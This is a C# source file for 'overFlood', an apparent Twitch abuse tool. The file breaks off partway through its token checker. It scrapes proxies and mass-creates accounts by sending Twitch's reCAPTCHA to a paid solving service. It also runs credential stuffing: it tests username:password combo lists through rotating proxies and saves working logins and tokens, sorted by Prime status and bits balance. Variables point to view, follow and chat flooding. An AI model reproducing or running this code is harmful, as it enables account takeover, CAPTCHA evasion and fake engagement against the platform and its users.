using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Net.WebSockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace overFlood
{
    public partial class MainForm : Form
    {
        #region Variables
        private StreamWriter createdAccounts;
        private StreamWriter createdTokens;
        private StreamWriter workingTokens;
        private StreamWriter primeTokens;
        private StreamWriter primeAvailableTokens;
        private StreamWriter bitsTokens;

        private StreamWriter legacyAccounts;

        private StreamWriter workingAccounts;
        private StreamWriter primeAccounts;
        private StreamWriter primeAvailableAccounts;
        private StreamWriter bitsAccounts;
        private StreamWriter workingTokens1;
        private StreamWriter primeTokens1;
        private StreamWriter primeAvailableTokens1;
        private StreamWriter bitsTokens1;

        private CancellationTokenSource creatorTokenSource;
        private CancellationTokenSource legacyCheckerTokenSource;
        private CancellationTokenSource accountCheckerTokenSource;
        private CancellationTokenSource tokenCheckerTokenSource;
        private CancellationTokenSource viewTokenSource;
        private CancellationTokenSource channelTokenSource;
        private CancellationTokenSource vodTokenSource;
        private CancellationTokenSource followTokenSource;
        private CancellationTokenSource chatTokenSource;
        private CancellationTokenSource subTokenSource;
        private CancellationTokenSource bitTokenSource;

        private string scrapedProxies;

        private string[] accountCreatorProxies;
        private int accountsCreated;
        private int accountsRetries;

        string[] legacyCheckerAccounts;
        int legacyHits;
        int legacyChecks;
        int legacyTotal;

        string[] accountCheckerProxies;
        string[] accountCheckerAccounts;
        int accountCheckerChecks;
        int accountCheckerTotal;
        int accountCheckerGood;
        int accountCheckerBad;
        int accountCheckerPrimes;
        int accountCheckerPrimeAvailable;
        int accountCheckerOverallBits;
        int accountCheckerRetries;

        string[] tokenCheckerTokens;
        int tokenCheckerChecks;
        int tokenCheckerTotal;
        int tokenCheckerGood;
        int tokenCheckerBad;
        int primes;
        int primeAvailable;
        int overallBits;

        string[] viewProxies;
        private int viewRequests;
        private int viewRequestsFailed;

        private string[] channelViewProxies;
        private int channelRequests;
        private int failChannelRequests;

        private string[] vodViewProxies;
        private int vodRequests;
        private int failVodRequests;

        string[] followTokens;
        string[] followProxies;
        string followChannelId;
        private int followSent;
        private int followRemoved;
        private int followFailed;

        string[] chatTokens;
        string[] chatProxies;
        string[] messages;
        int t;
        int messagesSuccess;
        int messagesFail;

        string[] subTokens;
        string[] subProxies;
        string subChannelId;
        int success;
        int fail;

        string[] bitTokens;
        string[] bitProxies;
        string bitChannelId;
        int bitSuccess;
        int bitFail;
        #endregion

        public MainForm()
        {
            CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
        }

        #region Proxy Scraper Methods
        private void btnScraperFetch_Click(object sender, EventArgs e)
        {
            scrapedProxies = null;

            using (HttpRequest httpRequest = new HttpRequest())
            {
                try
                {
                    scrapedProxies = httpRequest.Get($"https://api.proxyscrape.com?request=displayproxies&proxytype={comboScraperType.Text.ToLower()}&timeout={txtScraperTimeout.Text}&country={comboScraperCountry.Text}&anonymity={comboScraperAnonymity.Text.ToLower()}&ssl={comboScraperSSL.Text.ToLower()}").ToString();

                    lblProxiesFetched.Text = $"Proxies fetched: {scrapedProxies.Count(c => c == '\n')}";

                    string LastUpdated = httpRequest.Get($"https://api.proxyscrape.com/?request=lastupdated&proxytype={comboScraperType.Text.ToLower()}").ToString().Replace("Around ", "");
                    lblScraperUpdated.Text = $"Last Updated: {LastUpdated}";
                }
                catch (Exception)
                {
                    // ignored
                }

                MessageBox.Show($"Scraped {scrapedProxies.Count(c => c == '\n')} proxies", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void btnScraperCopyToClipboard_Click(object sender, EventArgs e)
        {
            if (scrapedProxies == null || !scrapedProxies.Any()) return;

            Clipboard.SetText(scrapedProxies);
            MessageBox.Show($"Copied {scrapedProxies.Count(c => c == '\n')} proxies to clipboard.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnScraperSave_Click(object sender, EventArgs e)
        {
            if (!scrapedProxies.Any()) return;

            var saveFileDialog = new SaveFileDialog
            {
                Title = "Save Proxies",
                Filter = "Text files (*.txt)|*.txt"
            };

            if (saveFileDialog.ShowDialog() != DialogResult.OK) return;

            var streamWriter = new StreamWriter(saveFileDialog.FileName);

            streamWriter.Write(scrapedProxies);

            streamWriter.Close();
            MessageBox.Show($"{scrapedProxies.Count(c => c == '\n')} proxies exported!", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        #endregion

        #region Account Creator Methods
        private void btnCreatorLoadProxies_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Proxies");
                if (string.IsNullOrEmpty(fileName)) return;
                accountCreatorProxies = Utilities.LoadFile(fileName);
                lblCreatorProxies.Text = $"Proxies: {accountCreatorProxies.Count()}";
                MessageBox.Show($"Loaded {accountCreatorProxies.Count()} proxies.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void btnCreatorStart_Click(object sender, EventArgs e)
        {
            if (accountCreatorProxies == null || !accountCreatorProxies.Any())
            {
                MessageBox.Show("Upload proxies list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            btnCreatorLoadProxies.Enabled = false;
            accountsCreated = 0;
            accountsRetries = 0;
            lblAccountsCreated.Text = "Accounts Created: 0";
            lblCreatorRetries.Text = "Retries: 0";
            txtCreator2CaptchaKey.Enabled = false;
            txtCreatorAmount.Enabled = false;
            txtCreatorThreads.Enabled = false;
            txtCreatorTimeout.Enabled = false;
            comboCreatorProxyType.Enabled = false;
            btnCreatorStart.Enabled = false;
            btnCreatorStop.Enabled = true;

            CreateDirectory1();

            ThreadPool.SetMinThreads(Convert.ToInt32(txtCreatorThreads.Text), Convert.ToInt32(txtCreatorThreads.Text));

            creatorTokenSource = new CancellationTokenSource();
            CancellationToken token = creatorTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtCreatorThreads.Text),
                CancellationToken = token
            };

            try
            {
                await Task.Run(() => Parallel.For(0, Convert.ToInt32(txtCreatorAmount.Text), parallelOptions, CreateAccount), token);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            createdAccounts.Dispose();
            createdTokens.Dispose();

            btnCreatorLoadProxies.Enabled = true;
            txtCreator2CaptchaKey.Enabled = true;
            txtCreatorAmount.Enabled = true;
            txtCreatorThreads.Enabled = true;
            comboCreatorProxyType.Enabled = true;
            txtCreatorTimeout.Enabled = true;
            btnCreatorStart.Enabled = true;
            btnCreatorStop.Enabled = false;
            MessageBox.Show($"Created {accountsCreated} accounts.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void CreateDirectory1()
        {
            string text = string.Format("Results/AG-{0:MM-dd-yy-hh-mm-ss}", DateTime.Now);
            Directory.CreateDirectory(text);

            createdAccounts = new StreamWriter(string.Format("{0}/accounts.txt", text), true)
            {
                AutoFlush = true
            };
            createdTokens = new StreamWriter(string.Format("{0}/tokens.txt", text), true)
            {
                AutoFlush = true
            };
        }

        private void CreateAccount(int num)
        {
            SolveRecaptchaV2("6Lcjjl8UAAAAAMCzOHbJj-yb2MBElPKqZmlE5bbL", "https://passport.twitch.tv/register", out string text);
            string username = new SmartGenerator().GenerateName(false) + new Random().Next(10, 1000);
            string password = GenerateCoupon(new Random().Next(6, 10));

            using (HttpRequest httpRequest = new HttpRequest())
            {
                while (true)
                {
                    string token;

                    try
                    {
                        string proxy = accountCreatorProxies[new Random().Next(0, accountCreatorProxies.Count())];

                        switch (comboCreatorProxyType.Text)
                        {
                            case "HTTP":
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                                break;
                            case "SOCKS4":
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                                break;
                            case "SOCKS4a":
                                httpRequest.Proxy = Socks4AProxyClient.Parse(proxy);
                                break;
                            case "SOCKS5":
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                                break;
                        }

                        httpRequest.ReadWriteTimeout = Convert.ToInt32(txtCreatorTimeout.Text);
                        httpRequest.ConnectTimeout = Convert.ToInt32(txtCreatorTimeout.Text);
                        httpRequest.AddHeader("Connection", "keep-alive");
                        httpRequest.AddHeader("Origin", "https://www.twitch.tv");
                        httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
                        httpRequest.AddHeader("Content-Type", "text/plain;charset=UTF-8");
                        httpRequest.AddHeader("Accept", "*");
                        httpRequest.AddHeader("Referer", "https://www.twitch.tv/");
                        httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                        httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");

                        var uri = new Uri("https://passport.twitch.tv/register");
                        var encoding = Encoding.UTF8;
                        object[] array = new object[15];
                        array[0] = "{\"username\":\"";
                        array[1] = username;
                        array[2] = "\",\"password\":\"";
                        array[3] = password;
                        array[4] = "\",\"email\":\"";
                        array[5] = username;
                        array[6] = "@jokerkard.ru\",\"birthday\":{\"day\":";
                        array[7] = new Random().Next(1, 27);
                        array[8] = ",\"month\":";
                        array[9] = new Random().Next(1, 12);
                        array[10] = ",\"year\":";
                        array[11] = new Random().Next(1992, 2001);
                        array[12] = "},\"client_id\":\"jzkbprff40iqj646a697cyrvl0zt2m6\",\"include_verification_code\":true,\"captcha\":{\"value\":\"";
                        array[13] = text;
                        array = array.ToArray();
                        object value = "\",\"key\":\"6Lcjjl8UAAAAAMCzOHbJj-yb2MBElPKqZmlE5bbL\"}}";
                        array.SetValue(value, 14);

                        token = Regex.Match(httpRequest.Post(uri, new BytesContent(encoding.GetBytes(string.Concat(array)))).ToString(), "access_token\":\"(.+?)\"").Groups[1].ToString();
                    }
                    catch (Exception)
                    {
                        Interlocked.Increment(ref accountsRetries);
                        lblCreatorRetries.Text = $"Retries: {accountsRetries}";
                        continue;
                    }

                    if (string.IsNullOrEmpty(token))
                    {
                        Interlocked.Increment(ref accountsRetries);
                        lblCreatorRetries.Text = $"Retries: {accountsRetries}";
                        continue;
                    }

                    WriteLine(createdTokens, token);
                    WriteLine(createdAccounts, username + ":" + password + ":" + token);
                    Interlocked.Increment(ref accountsCreated);
                    lblAccountsCreated.Text = $"Accounts Created: {accountsCreated}";
                    break;
                }
            }
        }


        private bool SolveRecaptchaV2(string googleKey, string pageUrl, out string result)
        {
            string requestUrl = "http://2captcha.com/in.php?key=" + txtCreator2CaptchaKey.Text + "&method=userrecaptcha&googlekey=" + googleKey + "&pageurl=" + pageUrl;

            try
            {
                WebRequest req = WebRequest.Create(requestUrl);

                using (WebResponse resp = req.GetResponse())
                using (StreamReader read = new StreamReader(resp.GetResponseStream()))
                {
                    string response = read.ReadToEnd();

                    if (response.Count() < 3)
                    {
                        result = response;
                        return false;
                    }
                    else
                    {
                        if (response.Substring(0, 3) == "OK|")
                        {
                            string captchaID = response.Remove(0, 3);

                            for (int i = 0; i < 24; i++)
                            {
                                WebRequest getAnswer = WebRequest.Create("http://2captcha.com/res.php?key=" + txtCreator2CaptchaKey.Text + "&action=get&id=" + captchaID);

                                using (WebResponse answerResp = getAnswer.GetResponse())
                                using (StreamReader answerStream = new StreamReader(answerResp.GetResponseStream()))
                                {
                                    string answerResponse = answerStream.ReadToEnd();

                                    if (answerResponse.Count() < 3)
                                    {
                                        result = answerResponse;
                                        return false;
                                    }
                                    else
                                    {
                                        if (answerResponse.Substring(0, 3) == "OK|")
                                        {
                                            result = answerResponse.Remove(0, 3);
                                            return true;
                                        }
                                        else if (answerResponse != "CAPCHA_NOT_READY")
                                        {
                                            result = answerResponse;
                                            return false;
                                        }
                                    }
                                }

                                Thread.Sleep(5000);
                            }

                            result = "Timeout";
                            return false;
                        }
                        else
                        {
                            result = response;
                            return false;
                        }
                    }
                }
            }
            catch { }

            result = "Unknown error";
            return false;
        }

        private static string GenerateCoupon(int length)
        {
            var random = new Random();
            const string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var result = new StringBuilder(length);
            for (var i = 0; i < length; i++)
            {
                result.Append(characters[random.Next(characters.Count())]);
            }
            return result.ToString();
        }

        private void btnCreatorStop_Click(object sender, EventArgs e)
        {
            creatorTokenSource.Cancel();
        }
        #endregion

        #region Legacy Checker Methods
        private void btnLegacyLoadAccounts_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Accounts");
                if (string.IsNullOrEmpty(fileName)) return;
                legacyCheckerAccounts = Utilities.LoadAccounts(fileName);
                lblLegacyAccounts.Text = $"Valid accounts: {legacyCheckerAccounts.Count()}";
                MessageBox.Show($"Loaded {legacyCheckerAccounts.Count()} valid accounts.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void btnLegacyStart_Click(object sender, EventArgs e)
        {
            if (legacyCheckerAccounts == null || !legacyCheckerAccounts.Any())
            {
                MessageBox.Show("Upload accounts list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            btnLegacyLoadAccounts.Enabled = false;
            txtLegacyThreads.Enabled = false;
            btnLegacyStart.Enabled = false;
            btnLegacyStop.Enabled = true;
            lblLegacyHits.Text = "Hits: 0";
            legacyHits = 0;
            legacyChecks = 0;
            legacyTotal = legacyCheckerAccounts.Count();
            lblLegacyChecked.Text = $"Checked: 0/{legacyTotal}";

            Directory.CreateDirectory("Results");
            legacyAccounts = new StreamWriter(string.Format("Results/LC-{0:MM-dd-yy-hh-mm-ss}.txt", DateTime.Now));

            ThreadPool.SetMinThreads(Convert.ToInt32(txtLegacyThreads.Text), Convert.ToInt32(txtLegacyThreads.Text));

            legacyCheckerTokenSource = new CancellationTokenSource();
            CancellationToken cancellationToken = legacyCheckerTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtLegacyThreads.Text),
                CancellationToken = cancellationToken
            };

            try
            {
                await Task.Run(() => Parallel.ForEach(legacyCheckerAccounts, parallelOptions, LegacyCheckAccount), cancellationToken);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            legacyAccounts.Dispose();

            btnLegacyLoadAccounts.Enabled = true;
            txtLegacyThreads.Enabled = true;
            btnLegacyStart.Enabled = true;
            btnLegacyStop.Enabled = false;
            MessageBox.Show($"Checked {legacyChecks} accounts. The results are stored in the 'Results' directory.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void LegacyCheckAccount(string combo)
        {
            try
            {
                if (combo.Contains(":"))
                {
                    string[] array = combo.Split(':');
                    string username = array[0];
                    string password = array[1];
                    string id = GetChannel(username);

                    StreamWriter ca;

                    if (!string.IsNullOrEmpty(id) && int.TryParse(id, out _) == true)
                    {
                        ca = legacyAccounts;
                        lock (ca)
                        {
                            legacyAccounts.WriteLine(username + ":" + password);
                        }

                        Interlocked.Increment(ref legacyHits);
                        lblLegacyHits.Text = $"Hits: {legacyHits}";
                    }

                    ca = legacyAccounts;
                    lock (ca)
                    {
                        legacyAccounts.Flush();
                    }
                }
            }
            catch (Exception)
            {
                // ignored
            }

            Interlocked.Increment(ref legacyChecks);
            lblLegacyChecked.Text = $"Checked: {legacyChecks}/{legacyTotal}";
        }

        private void btnLegacyStop_Click(object sender, EventArgs e)
        {
            legacyCheckerTokenSource.Cancel();
        }
        #endregion

        #region Account Checker Methods
        private void btnAccountCheckerLoadProxies_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Proxies");
                if (string.IsNullOrEmpty(fileName)) return;
                accountCheckerProxies = Utilities.LoadFile(fileName);
                lblAccountCheckerProxies.Text = $"Proxies: {accountCheckerProxies.Count()}";
                MessageBox.Show($"Loaded {accountCheckerProxies.Count()} proxies.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void btnAccountCheckerLoadAccounts_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Accounts");
                if (string.IsNullOrEmpty(fileName)) return;
                accountCheckerAccounts = Utilities.LoadAccounts(fileName);
                lblCheckerAccounts.Text = $"Valid accounts: {accountCheckerAccounts.Count()}";
                MessageBox.Show($"Loaded {accountCheckerAccounts.Count()} valid accounts.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void btnAccountCheckerStart_Click(object sender, EventArgs e)
        {
            if (accountCheckerAccounts == null || !accountCheckerAccounts.Any())
            {
                MessageBox.Show("Upload accounts list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            if (accountCheckerProxies == null || !accountCheckerProxies.Any())
            {
                MessageBox.Show("Upload proxies list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            btnAccountCheckerLoadProxies.Enabled = false;
            btnAccountCheckerLoadAccounts.Enabled = false;
            txtAccountCheckerThreads.Enabled = false;
            comboCheckerProxyType.Enabled = false;
            txtCheckerTimeout.Enabled = false;
            btnAccountCheckerStart.Enabled = false;
            btnAccountCheckerStop.Enabled = true;
            lblAccountCheckerGood.Text = "Hits: 0";
            lblAccountCheckerInvalid.Text = "Invalid: 0";
            lblAccountCheckerPrimes.Text = "Prime: 0";
            lblAccountCheckerPrimeAvailable.Text = "Primes Available: 0";
            lblAccountCheckerBits.Text = "Bits: 0";
            lblAccountCheckerRetries.Text = "Retries: 0";
            accountCheckerChecks = 0;
            accountCheckerTotal = accountCheckerAccounts.Count();
            accountCheckerGood = 0;
            accountCheckerBad = 0;
            accountCheckerPrimeAvailable = 0;
            accountCheckerOverallBits = 0;
            accountCheckerPrimes = 0;
            accountCheckerRetries = 0;
            lblAccountCheckerChecked.Text = $"Checked: 0/{accountCheckerTotal}";

            CreateDirectory3();

            ThreadPool.SetMinThreads(Convert.ToInt32(txtAccountCheckerThreads.Text), Convert.ToInt32(txtAccountCheckerThreads.Text));

            accountCheckerTokenSource = new CancellationTokenSource();
            CancellationToken cancellationToken = accountCheckerTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtAccountCheckerThreads.Text),
                CancellationToken = cancellationToken
            };

            try
            {
                await Task.Run(() => Parallel.ForEach(accountCheckerAccounts, parallelOptions, CheckAccount), cancellationToken);
            }
            catch (OperationCanceledException)
            {
                // ignored
            }

            workingAccounts.Dispose();
            primeAccounts.Dispose();
            primeAvailableAccounts.Dispose();
            bitsAccounts.Dispose();
            workingTokens1.Dispose();
            primeTokens1.Dispose();
            primeAvailableTokens1.Dispose();
            bitsTokens1.Dispose();

            btnAccountCheckerLoadProxies.Enabled = true;
            btnAccountCheckerLoadAccounts.Enabled = true;
            txtAccountCheckerThreads.Enabled = true;
            comboCheckerProxyType.Enabled = true;
            txtCheckerTimeout.Enabled = true;
            btnAccountCheckerStart.Enabled = true;
            btnAccountCheckerStop.Enabled = false;
            MessageBox.Show($"Checked {accountCheckerChecks} accounts. The results are stored in the 'Results' directory.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void btnAccountCheckerStop_Click(object sender, EventArgs e)
        {
            accountCheckerTokenSource.Cancel();
        }

        private void CreateDirectory3()
        {
            string text = string.Format("Results/AC-{0:MM-dd-yy-hh-mm-ss}", DateTime.Now);
            Directory.CreateDirectory(text);
            workingAccounts = new StreamWriter(string.Format("{0}/accounts.txt", text), true)
            {
                AutoFlush = true
            };
            primeAccounts = new StreamWriter(string.Format("{0}/prime-accounts.txt", text), true)
            {
                AutoFlush = true
            };
            primeAvailableAccounts = new StreamWriter(string.Format("{0}/prime-available-accounts.txt", text), true)
            {
                AutoFlush = true
            };
            bitsAccounts = new StreamWriter(string.Format("{0}/bits-accounts.txt", text), true)
            {
                AutoFlush = true
            };
            workingTokens1 = new StreamWriter(string.Format("{0}/tokens.txt", text), true)
            {
                AutoFlush = true
            };
            primeTokens1 = new StreamWriter(string.Format("{0}/prime-tokens.txt", text), true)
            {
                AutoFlush = true
            };
            primeAvailableTokens1 = new StreamWriter(string.Format("{0}/prime-available-tokens.txt", text), true)
            {
                AutoFlush = true
            };
            bitsTokens1 = new StreamWriter(string.Format("{0}/bits-tokens.txt", text), true)
            {
                AutoFlush = true
            };
        }

        private void CheckAccount(string account)
        {
            string username = null;
            string password = null;
            string text = null;

            try
            {
                string[] array = account.Split(new char[]
                {
                    ':'
                });

                username = array[0];
                password = array[1];

                text = string.Concat(new string[]
                {
                    "{\"username\":\"",
                    username,
                    "\",\"password\":\"",
                    password,
                    "\",\"client_id\":\"kimne78kx3ncx6brgo4mv6wki5h1ko\"}}"
                });
            }
            catch (Exception)
            {
                Interlocked.Increment(ref accountCheckerBad);
                lblAccountCheckerInvalid.Text = $"Invalid: {accountCheckerBad}";
                Interlocked.Increment(ref accountCheckerChecks);
                lblAccountCheckerChecked.Text = $"Checked: {accountCheckerChecks}/{accountCheckerTotal}";
                return;
            }

            while (true)
            {
                int num = new Random().Next(accountCheckerProxies.Count());
                int index = num;

                ProxyType proxyType;

                switch (comboCheckerProxyType.Text)
                {
                    case "HTTP":
                        proxyType = ProxyType.HTTP;
                        break;
                    case "SOCKS4":
                        proxyType = ProxyType.Socks4;
                        break;
                    case "SOCKS4a":
                        proxyType = ProxyType.Socks4A;
                        break;
                    case "SOCKS5":
                        proxyType = ProxyType.Socks5;
                        break;
                    default:
                        proxyType = ProxyType.HTTP;
                        break;
                }

                ProxyClient proxyClient = ProxyClient.Parse(proxyType, accountCheckerProxies[index]);
                proxyClient.ConnectTimeout = Convert.ToInt32(txtCheckerTimeout.Text);
                proxyClient.ReadWriteTimeout = Convert.ToInt32(txtCheckerTimeout.Text);

                string response = LoginAccount(text, proxyClient);

                if (!response.Contains("access_token"))
                {
                    if (!response.Contains("user does not exist") && !response.Contains("user has been deleted") && !response.Contains("suspended user") && !response.Contains("user credentials incorrect") && !response.Contains("invalid username") && !response.Contains("user needs password reset") && !response.Contains("invalid password"))
                    {
                        Interlocked.Increment(ref accountCheckerRetries);
                        lblAccountCheckerRetries.Text = $"Retries: {accountCheckerRetries}";
                        continue;
                    }

                    Interlocked.Increment(ref accountCheckerBad);
                    lblAccountCheckerInvalid.Text = $"Invalid: {accountCheckerBad}";
                }
                else
                {
                    string value = new Regex("access_token\":\"(.+)\"").Match(response).Groups[1].Value.Replace("\",\"redirect_path\":\"https://www.twitch.tv/", "");
                    string text1;
                    while ((text1 = CheckToken(value, username)) == null)
                    {
                    }
                    CheckAccount(account, value, text1);
                }

                Interlocked.Increment(ref accountCheckerChecks);
                lblAccountCheckerChecked.Text = $"Checked: {accountCheckerChecks}/{accountCheckerTotal}";
                break;
            }
        }

        private string LoginAccount(string text, ProxyClient proxyClient)
        {
            string result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                httpRequest.UserAgent = Http.ChromeUserAgent();
                httpRequest.Referer = "https://www.twitch.tv/";
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.Reconnect = false;
                httpRequest.Proxy = proxyClient;
                httpRequest.AddHeader("Origin", "https://www.twitch.tv");
                try
                {
                    result = httpRequest.Post("https://passport.twitch.tv/login", text, "text/plain;charset=UTF-8").ToString();
                }
                catch (Exception)
                {
                    result = "request error";
                }
            }
            return result;
        }

        private string CheckToken(string token, string username)
        {
            string result;
            using (HttpRequest httpRequest = new HttpRequest())
            {
                httpRequest.UserAgent = Http.RandomUserAgent();
                httpRequest.Referer = "https://www.twitch.tv/";
                httpRequest.ConnectTimeout = Convert.ToInt32(txtCheckerTimeout.Text);
                httpRequest.ReadWriteTimeout = Convert.ToInt32(txtCheckerTimeout.Text);
                httpRequest.IgnoreProtocolErrors = true;
                httpRequest.Reconnect = false;
                httpRequest.Authorization = "OAuth " + token;
                httpRequest.AddHeader("Pragma", "no-cache");
                httpRequest.AddHeader("Origin", "https://twitch.tv");
                httpRequest.AddHeader("Client-Id", "kimne78kx3ncx6brgo4mv6wki5h1ko");
                string str = "[{\"operationName\":\"PrimeSubscribe_UserPrimeData\",\"variables\":{\"login\":\"" + username + "\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"58c25a2b0ccbde33498f3a5cf6027ff32168febd8a63b749f184028e8ab9192a\"}}},{\"operationName\":\"Inventory\",\"variables\":{},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"22c44231a1332132801f93866bdf1c985995df85e87e2dec45a24fbb66e9a03c\"}}}]";
                try
                {
                    result = httpRequest.Post("https://gql.twitch.tv/gql", str, "text/plain;charset=UTF-8").ToString();
                }
                catch (Exception)
                {
                    result = "request error";
                }
            }
            return result;
        }

        private void CheckAccount(string account, string token, string response)
        {
            Interlocked.Increment(ref accountCheckerGood);
            lblAccountCheckerGood.Text = $"Hits: {accountCheckerGood}";

            bool isPrime = response.Contains("hasPrime\":true") && response.Contains("willRenew\":true");
            bool isPrimeAvailable = response.Contains("canPrimeSubscribe\":true");

            if (isPrimeAvailable)
            {
                WriteLine(primeAvailableAccounts, account);
                WriteLine(primeAvailableTokens1, token);
                Interlocked.Increment(ref accountCheckerPrimeAvailable);
                lblAccountCheckerPrimeAvailable.Text = $"Primes Available: {accountCheckerPrimeAvailable}";
            }
            else if (isPrime)
            {
                string date = new Regex("renewalDate\":(.*?),\"").Match(response).Groups[1].Value.Substring(1).Split(new char[]
                {
                        'T'
                })[0];
                string time = new Regex("renewalDate\":(.*?),\"").Match(response).Groups[1].Value.Substring(1).Split(new char[]
                {
                        'T'
                })[1];
                WriteLine(primeAccounts, account + " - " + date + " " + time.Split(':')[0] + ":" + time.Split(':')[1] + ":" + time.Split(':')[2].Replace(time.Split('.')[1], "").Replace(".", ""));
                WriteLine(primeTokens1, token + " - " + date + " " + time.Split(':')[0] + ":" + time.Split(':')[1] + ":" + time.Split(':')[2].Replace(time.Split('.')[1], "").Replace(".", ""));
                Interlocked.Increment(ref accountCheckerPrimes);
                lblAccountCheckerPrimes.Text = $"Primes: {accountCheckerPrimes}";
            }
            else
            {
                WriteLine(workingAccounts, account);
                WriteLine(workingTokens1, token);
            }

            int.TryParse(new Regex("bitsBalance\":(.*?),\"").Match(response).Groups[1].Value, out int bits);

            if (bits > 0)
            {
                WriteLine(bitsAccounts, string.Format("{0}: {1}", account, bits));
                WriteLine(bitsTokens1, string.Format("{0}:{1}", token, bits));
                Interlocked.Add(ref accountCheckerOverallBits, bits);
                lblAccountCheckerBits.Text = $"Bits: {accountCheckerOverallBits}";
            }
        }
        #endregion

        #region Token Checker Methods
        private void btnTokenCheckerLoadTokens_Click(object sender, EventArgs e)
        {
            try
            {
                string fileName = Utilities.OpenFileDialog("Load Tokens");
                if (string.IsNullOrEmpty(fileName)) return;
                tokenCheckerTokens = Utilities.LoadFile(fileName);
                lblTokenCheckerTokens.Text = $"Tokens: {tokenCheckerTokens.Count()}";
                MessageBox.Show($"Loaded {tokenCheckerTokens.Count()} tokens.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private async void btnTokenCheckerStart_Click(object sender, EventArgs e)
        {
            if (tokenCheckerTokens == null || !tokenCheckerTokens.Any())
            {
                MessageBox.Show("Upload tokens list.", "overFlood", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }

            btnTokenCheckerLoadTokens.Enabled = false;
            txtTokenCheckerThreads.Enabled = false;
            btnTokenCheckerStart.Enabled = false;
            btnTokenCheckerStop.Enabled = true;
            lblTokenCheckerGood.Text = "Hits: 0";
            lblTokenCheckerBad.Text = "Invalid: 0";
            lblTokenCheckerPrimes.Text = "Prime: 0";
            lblTokenCheckerPrimeAvailable.Text = "Primes Available: 0";
            lblTokenCheckerBits.Text = "Bits: 0";
            tokenCheckerChecks = 0;
            tokenCheckerTotal = tokenCheckerTokens.Count();
            tokenCheckerGood = 0;
            tokenCheckerBad = 0;
            primeAvailable = 0;
            overallBits = 0;
            primes = 0;
            lblTokenCheckerChecked.Text = $"Checked: 0/{tokenCheckerTotal}";

            CreateDirectory();

            ThreadPool.SetMinThreads(Convert.ToInt32(txtTokenCheckerThreads.Text), Convert.ToInt32(txtTokenCheckerThreads.Text));

            tokenCheckerTokenSource = new CancellationTokenSource();
            CancellationToken cancellationToken = tokenCheckerTokenSource.Token;

            ParallelOptions parallelOptions = new ParallelOptions
            {
                MaxDegreeOfParallelism = Convert.ToInt32(txtTokenCheckerThreads.Text),
                CancellationToken = cancellationToken
            };

            try
            {
                await Task.Run(() => Parallel.ForEach(tokenCheckerTokens, parallelOptions, delegate (string token)
                {
                    if (tokenCheckerTokenSource.IsCancellationRequested)
                    {
                        return;
                    }

                    try
                    {
                        if (token.Contains(":"))
                            token = token.Contains("oauth:") ? token.Split(':')[1] : token.Split(':')[0];
                        string text;
                        while ((text = CheckToken(token)) == "request error")
                        {
                        }
                        if (string.IsNullOrEmpty(text))
